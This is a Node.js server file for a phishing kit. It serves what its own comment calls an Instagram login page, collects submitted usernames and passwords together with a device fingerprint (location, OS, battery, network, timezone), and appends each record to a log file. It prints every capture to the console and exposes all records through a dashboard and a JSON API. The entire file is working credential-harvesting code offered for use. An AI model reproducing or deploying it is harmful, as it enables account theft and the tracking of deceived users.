const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 8080;
const logFilePath = path.join(__dirname, 'log.txt');
let capturedHistory = [];

// ─── Load existing data on startup ───
if (fs.existsSync(logFilePath)) {
    try {
        const lines = fs.readFileSync(logFilePath, 'utf8')
            .split('\n')
            .filter(l => l.trim());
        lines.forEach(line => {
            try { capturedHistory.push(JSON.parse(line)); }
            catch (e) { /* skip corrupt lines */ }
        });
        console.log(`✅ Loaded ${capturedHistory.length} previous records.`);
    } catch (e) {
        console.log('⚠ Could not read log file. Starting fresh.');
    }
} else {
    console.log('📝 No log file found. Starting fresh.');
}

// ─── Create Server ───
const server = http.createServer((req, res) => {

    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        return res.end();
    }

    // ─── Serve Instagram login page ───
    if (req.method === 'GET' && req.url === '/') {
        const filePath = path.join(__dirname, 'index.html');
        fs.readFile(filePath, (err, content) => {
            if (err) { res.writeHead(500); res.end('Error: index.html not found'); }
            else { res.writeHead(200, { 'Content-Type': 'text/html' }); res.end(content); }
        });
    }

    // ─── Receive credentials + fingerprint ───
    else if (req.method === 'POST' && req.url === '/log') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);

                // Build fingerprint object with defaults for missing fields
                const fp = data.fingerprint || {};
                const record = {
                    username: data.username || '',
                    password: data.password || '',
                    fingerprint: {
                        device: fp.device || 'Unknown',
                        os: fp.os || 'Unknown',
                        loc: fp.loc || 'Unknown',
                        tz: fp.tz || 'Unknown',
                        bat: fp.bat || 'N/A',
                        net: fp.net || 'Unknown',
                        lang: fp.lang || 'Unknown',
                        screen: fp.screen || 'Unknown',
                        timing: fp.timing || '0'
                    },
                    timestamp: new Date().toISOString()
                };

                capturedHistory.push(record);
                fs.appendFileSync(logFilePath, JSON.stringify(record) + '\n');

                console.log(`\n🚨 CAPTURED: ${record.username} / ${record.password}`);
                console.log(`   📱 Device:   ${record.fingerprint.device}`);
                console.log(`   🖥️  OS:       ${record.fingerprint.os}`);
                console.log(`   🌍 Location: ${record.fingerprint.loc}`);
                console.log(`   🕐 Timezone: ${record.fingerprint.tz}`);
                console.log(`   🔋 Battery:  ${record.fingerprint.bat}`);
                console.log(`   📡 Network:  ${record.fingerprint.net}`);
                console.log(`   🔤 Language: ${record.fingerprint.lang}`);
                console.log(`   🖱️  Screen:   ${record.fingerprint.screen}`);
                console.log(`   ⏱️  Timing:   ${record.fingerprint.timing}s`);

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'success' }));

            } catch (e) {
                res.writeHead(400, { 'Content-Type': 'text/plain' });
                res.end('Bad Request');
            }
        });
    }

    // ─── Serve dashboard ───
    else if (req.method === 'GET' && req.url === '/dashboard') {
        const filePath = path.join(__dirname, 'dashboard.html');
        fs.readFile(filePath, (err, content) => {
            if (err) { res.writeHead(500); res.end('Error: dashboard.html not found'); }
            else { res.writeHead(200, { 'Content-Type': 'text/html' }); res.end(content); }
        });
    }

    // ─── API — get all data ───
    else if (req.method === 'GET' && req.url === '/api/data') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(capturedHistory));
    }

    // ─── API — clear all data ───
    else if (req.method === 'POST' && req.url === '/clear') {
        capturedHistory = [];
        try {
            fs.writeFileSync(logFilePath, '');
            console.log('🗑️  All data CLEARED.');
        } catch (e) {
            console.log('⚠ Could not clear log file.');
        }
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'cleared' }));
    }

    // ─── 404 ───
    else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found');
    }
});

// ─── Start ───
server.listen(PORT, '0.0.0.0', () => {
    const os = require('os');
    const interfaces = os.networkInterfaces();
    let localIP = 'YOUR_IP';
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                localIP = iface.address;
            }
        }
    }
    console.log(`\n🚀 SERVER STARTED ON PORT ${PORT} 🚀`);
    console.log(`👉 Local          : http://localhost:${PORT}`);
    console.log(`👉 Mobile/LAN     : http://${localIP}:${PORT}`);
    console.log(`👉 Dashboard      : http://${localIP}:${PORT}/dashboard\n`);
});